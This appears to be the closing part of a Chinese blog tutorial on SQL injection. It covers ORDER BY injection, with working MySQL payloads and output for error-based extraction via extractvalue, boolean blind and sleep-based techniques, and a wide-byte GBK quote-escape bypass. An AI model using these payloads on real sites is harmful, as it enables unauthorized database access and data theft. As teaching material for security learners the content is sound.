+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user order by 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.5.53~&apos;</span><br><span class="line">mysql&gt; select * from user order by 1 and extractvalue(1, concat(0x7e, (select database()),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~test~&apos;</span><br></pre></td></tr></table></figure>
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>盲注的基本操作\<br><code>order by IF((bool),1,(select 1 union select 2))</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user order by if((substr(database(),1,1)&lt;&apos;a&apos;),1,(select 1 union select 2));</span><br><span class="line">ERROR 1242 (21000): Subquery returns more than 1 row</span><br><span class="line">mysql&gt; select * from user order by if((substr(database(),1,1)&gt;&apos;a&apos;),1,(select 1 union select 2));</span><br><span class="line">+------+---------------+-----------------------+</span><br><span class="line">| id   | name          | pass                  |</span><br><span class="line">+------+---------------+-----------------------+</span><br><span class="line">|    1 | aaaaaaaaaa    | 123                   |</span><br><span class="line">|    2 | bbbbbbbbbbbbb | 456                   |</span><br><span class="line">|    3 | ccccccccccc   | 3.2210671827446896e16 |</span><br><span class="line">|    4 | dddddddddddd  | 258                   |</span><br><span class="line">|    5 | eeeeeeeee     | 159                   |</span><br><span class="line">| NULL |               | NULL                  |</span><br><span class="line">|    6 | cccc          | 58                    |</span><br><span class="line">|    7 | chuddy        | 1952805748            |</span><br><span class="line">+------+---------------+-----------------------+</span><br><span class="line">8 rows in set (0.02 sec)</span><br></pre></td></tr></table></figure></p>
+<h4 id="延时注入-1"><a href="#延时注入-1" class="headerlink" title="延时注入"></a>延时注入</h4><p>不推荐，因为每条数据都会执行延时，能用其他方法就不使用延时。\<br><code>order by IF(1,sleep(3),0)</code>;</p>
+<p>两条数据就会延时了6秒</p>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>原理：在<code>GBK</code>编码时，<code>mysql</code>会认为两个字符是一个汉字（在前一个字节的ascii码大于128的情况下）。而经过转义之后的单引号<code>&#39;</code>会变为<code>\&#39;</code>，即<code>%5c%27</code>。构造<code>id=1%df%27%23</code>，在经过转义传递给<code>mysql</code>时，就是<code>id=1%df%5c%27%23</code>，mysql在解析时，会认为<code>%df%5c</code>是一个汉字，而<code>%27</code>就会闭合掉原本sql语句中的（左）单引号，即<code>select xxx from xxx where id=&#39;%df%5c&#39;#&#39;</code>，<code>%23</code>用于注释掉原本sql语句中的（右）单引号。这就是宽字节注入的原理。</p>
+<p>注入方式和正常的注入差不多的： <code>%df%27%20union%20select%201,database()--+</code></p>
+
+            <div class="post-copyright">
+    <div class="content">
+        <p>最后更新： 2019年05月08日 23:12</p>
+        <p>原始链接： <a class="post-url" href="/2019/04/22/sql注入/" title="sql注入">http://yoursite.com/2019/04/22/sql注入/</a></p>
+        <footer>
+            <a href="http://yoursite.com">
+                <img src="/images/logo.png" alt="chuddy">
+                chuddy
+            </a>
+        </footer>
+    </div>
+</div>
+
+      
+        
+            
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;">赏</a>
+</div>
+
+<div id="reward" class="post-modal reward-lay">
+    <a class="close" href="javascript:;" id="reward-close">×</a>
+    <span class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        请我吃糖~
+        <i class="icon icon-quote-right"></i>
+    </span>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/images/wechat_code.jpg" alt="打赏二维码">
+        </div>
+        <div class="reward-select">
+            
+            <label class="reward-select-item checked" data-id="wechat" data-wechat="/images/wechat_code.jpg">
+                <img class="reward-select-item-wechat" src="/images/wechat.png" alt="微信">
+            </label>
+            
+            
+            <label class="reward-select-item" data-id="alipay" data-alipay="/images/alipay_code.jpg">
+                <img class="reward-select-item-alipay" src="/images/alipay.png" alt="支付宝">
+            </label>
+            
+        </div>
+    </div>
+</div>
+
+
+        
+    </div>
+    <footer class="article-footer">
+        
+        
+<div class="post-share">
+    <a href="javascript:;" id="share-sub" class="post-share-fab">
+        <i class="fa fa-share-alt"></i>
+    </a>
+    <div class="post-share-list" id="share-list">
+        <ul class="share-icons">
+          <li>
+            <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/04/22/sql注入/&title=《sql注入》 — chuddy's Blog&pic=http://yoursite.comimages/logo.png" data-title="微博">
+              <i class="fa fa-weibo"></i>
+            </a>
+          </li>
+          <li>
+            <a class="weixin share-sns" id="wxFab" href="javascript:;" data-title="微信">
+              <i class="fa fa-weixin"></i>
+            </a>
+          </li>
+          <li>
+            <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/04/22/sql注入/&title=《sql注入》 — chuddy's Blog&source=" data-title="QQ">
+              <i class="fa fa-qq"></i>
+            </a>
+          </li>
+          <li>
+            <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/04/22/sql注入/" data-title="Facebook">
+              <i class="fa fa-facebook"></i>
+            </a>
+          </li>
+          <li>
+            <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《sql注入》 — chuddy's Blog&url=http://yoursite.com/2019/04/22/sql注入/&via=http://yoursite.com" data-title="Twitter">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+          <li>
+            <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2019/04/22/sql注入/" data-title="Google+">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        </ul>
+     </div>
+</div>
+<div class="post-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" id="wxShare-close">×</a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://yoursite.com/2019/04/22/sql注入/" alt="微信分享二维码">
+</div>
+
+<div class="mask"></div>
+
+        
+        <ul class="article-footer-menu">
+            
+            
+  <li class="article-footer-tags">
+    <i class="fa fa-tags"></i>
+      
+    <a href="/tags/web漏洞/" class="color1">web漏洞</a>
+      
+  </li>
+
+        </ul>
+        
+    </footer>
+  </div>
+</article>
+
+
+    <aside class="post-toc-pos post-toc-top" id="post-toc">
+        <nav class="post-toc-wrap">
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#sql注入漏洞"><span class="post-toc-text">sql注入漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sql注入简介"><span class="post-toc-text">sql注入简介</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#mysql数据库的知识储备"><span class="post-toc-text">mysql数据库的知识储备</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#常见的sql注入类型"><span class="post-toc-text">常见的sql注入类型</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#union注入"><span class="post-toc-text">union注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#猜字段的长度"><span class="post-toc-text">猜字段的长度</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#猜字段的位置"><span class="post-toc-text">猜字段的位置</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#基本语法"><span class="post-toc-text">基本语法</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#过滤了逗号的联合注入"><span class="post-toc-text">过滤了逗号的联合注入</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#报错注入"><span class="post-toc-text">报错注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#floor"><span class="post-toc-text">floor</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#ExtractValue-有长度限制-最长32位"><span class="post-toc-text">ExtractValue(有长度限制,最长32位)</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#UpdateXml-有长度限制-最长32位"><span class="post-toc-text">UpdateXml(有长度限制,最长32位)</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#NAME-CONST-适用于低版本，不太好用"><span class="post-toc-text">NAME_CONST(适用于低版本，不太好用)</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Error-based-Double-Query-Injection"><span class="post-toc-text">Error based Double Query Injection</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#exp-5-5-5以上"><span class="post-toc-text">exp(5.5.5以上)</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#polygon"><span class="post-toc-text">polygon</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#布尔盲注"><span class="post-toc-text">布尔盲注</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#构造布尔条件的骚姿势"><span class="post-toc-text">构造布尔条件的骚姿势</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#构造逻辑判断"><span class="post-toc-text">构造逻辑判断</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#延时注入"><span class="post-toc-text">延时注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#insert和uodate注入"><span class="post-toc-text">insert和uodate注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#order-by-注入"><span class="post-toc-text">order by 注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#报错注入-1"><span class="post-toc-text">报错注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#盲注"><span class="post-toc-text">盲注</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#延时注入-1"><span class="post-toc-text">延时注入</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#宽字节注入"><span class="post-toc-text">宽字节注入</span></a></li></ol></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+    
+
+<nav id="article-nav">
+  
+    <a href="/2019/05/08/php伪随机数/" id="article-nav-newer" class="article-nav-link-wrap">
+
+      <span class="article-nav-title">
+        <i class="fa fa-hand-o-left" aria-hidden="true"></i>
+        
+          php伪随机数
+        
+      </span>
+    </a>
+  
+  
+    <a href="/2019/04/22/2019didictf部分writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-title">didictf writeup</span>
+      <i class="fa fa-hand-o-right" aria-hidden="true"></i>
+    </a>
+  
+</nav>
+
+
+
+    
+</section>
+        
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+<p>
+    <span id="busuanzi_container_site_uv" style="display:none">
+        总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style="display:none">
+        总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+      <p>
+        Powered by  <a href="http://hexo.io/" target="_blank">Hexo</a>
+        Theme <a href="//github.com/wongminho/hexo-theme-miho" target="_blank">MiHo</a>
+      &copy; 2019 chuddy<br>
+      </p>
+    </div>
+  </div>
+</footer>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script>
+  var mihoConfig = {
+      root: "http://yoursite.com",
+      animate: true,
+      isHome: false,
+      share: true,
+      reward: 1
+  }
+</script>
+<div class="sidebar">
+    <div id="sidebar-search" title="Search">
+        <i class="fa fa-search"></i>
+    </div>
+    <div id="sidebar-category" title="Categories">
+        <i class="fa fa-book"></i>
+    </div>
+    <div id="sidebar-tag" title="Tags">
+        <i class="fa fa-tags"></i>
+    </div>
+    <div id="sidebar-top">
+        <span class="sidebar-top-icon"><i class="fa fa-angle-up"></i></span>
+    </div>
+</div>
+<div class="sidebar-menu-box" id="sidebar-menu-box">
+    <div class="sidebar-menu-box-container">
+        <div id="sidebar-menu-box-categories">
+            <a class="category-link" href="/categories/web/">web</a><a class="category-link" href="/categories/writeup/">writeup</a>
+        </div>
+        <div id="sidebar-menu-box-tags">
+            <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/web漏洞/" style="font-size: 20px;">web漏洞</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/安全工具/" style="font-size: 10px;">安全工具</a>
+        </div>
+    </div>
+    <a href="javascript:;" class="sidebar-menu-box-close">&times;</a>
+</div>
+<div class="mobile-header-menu-nav" id="mobile-header-menu-nav">
+    <div class="mobile-header-menu-container">
+        <span class="title">Menus</span>
+        <ul class="mobile-header-menu-navbar">
+            
+            <li>
+                <a href="/">
+                    <i class="fa fa-home"></i><span>Home</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/archives">
+                    <i class="fa fa-archive"></i><span>Archives</span>
+                </a>
+            </li>
+            
+            <li>
+                <a href="/about">
+                    <i class="fa fa-user"></i><span>About</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    <div class="mobile-header-tag-container">
+        <span class="title">Tags</span>
+        <div id="mobile-header-container-tags">
+            <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/web漏洞/" style="font-size: 20px;">web漏洞</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/安全工具/" style="font-size: 10px;">安全工具</a>
+        </div>
+    </div>
+</div>
+<div class="search-wrap">
+    <span class="search-close">&times;</span>
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+            <i class="icon icon-lg icon-chevron-left"></i>
+        </a>
+        <input class="search-field" placeholder="Search..." id="keywords">
+        <a id="search-submit" href="javascript:;">
+            <i class="fa fa-search"></i>
+        </a>
+    <div class="search-container" id="search-container">
+        <ul class="search-result" id="search-result">
+        </ul>
+    </div>
+</div>
+
+<div id="search-tpl">
+    <li class="search-result-item">
+        <a href="{url}" class="search-item-li">
+            <span class="search-item-li-title" title="{title}">{title}</span>
+        </a>
+    </li>
+</div>
+<script src="/js/search.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="//cdn.bootcss.com/particles.js/2.0.0/particles.min.js"></script>
+  <div id="particles"></div>
+  <script src="/js/particles.js"></script>
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  <script src="//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js"></script>
+  <script src="/js/animate.js"></script>
+
+
+  <script src="/js/pop-img.js"></script>
+  <script>
+     $(".article-entry p img").popImg();
+  </script>
+
+  </div>
+</body>
+</html>
